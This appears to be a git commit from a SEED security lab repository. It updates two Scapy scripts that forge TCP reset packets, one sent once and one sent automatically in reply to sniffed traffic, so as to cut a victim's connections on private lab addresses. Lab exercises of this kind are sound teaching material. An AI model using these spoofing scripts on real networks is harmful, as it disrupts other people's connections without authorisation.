2d2cff895f45fe7089fe332416411df5380691da
Travis Peters//SeedVM <traviswp@gmail.com//SeedVM>
2020-03-11 14:01:01 -0400

    my config

--- 16_tcp_attacks/reset.py
+++ 16_tcp_attacks/reset.py
@@ -3,8 +3,8 @@ import sys
 from scapy.all import *
 
 print("SENDING RESET PACKET.........")
-IPLayer = IP(src="10.0.2.69", dst="10.0.2.68")
-TCPLayer = TCP(sport=23, dport=53520,flags="R", seq=1493270842)
+IPLayer = IP(src="10.0.2.8", dst="10.0.2.9")
+TCPLayer = TCP(sport=23, dport=46846,flags="R", seq=1219968966)
 pkt = IPLayer/TCPLayer
 ls(pkt)
 send(pkt, verbose=0)
--- 16_tcp_attacks/reset_auto.py
+++ 16_tcp_attacks/reset_auto.py
@@ -2,11 +2,11 @@
 from scapy.all import *
 
 def spoof_tcp(pkt):
-   IPLayer  = IP(dst="10.0.2.68", src=pkt[IP].dst)
+   IPLayer  = IP(dst="10.0.2.9", src=pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                   dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    print("one")
    send(spoofpkt, verbose=0)
 
-pkt=sniff(filter='tcp and src host 10.0.2.68', prn=spoof_tcp)
+pkt=sniff(filter='tcp and src host 10.0.2.9', prn=spoof_tcp)
